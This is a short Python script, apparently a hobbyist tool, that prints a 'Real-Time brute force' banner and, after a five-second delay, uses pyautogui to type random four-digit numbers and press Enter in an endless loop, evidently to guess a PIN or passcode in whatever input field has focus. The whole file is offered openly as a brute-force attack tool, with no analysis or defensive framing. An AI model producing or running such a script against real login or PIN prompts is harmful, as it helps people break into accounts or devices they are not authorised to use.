import pyautogui
import random
import time


print('<<<Real-Time brute force>>>')
time.sleep(1)
print('---|The attack will start in 5 second/s|---')
time.sleep(5)
print('<<<The attack has been started>>>')
while True:
    print('Processing...')
    pyautogui.typewrite(str(random.randint(1111,9999)))
    pyautogui.press("enter")
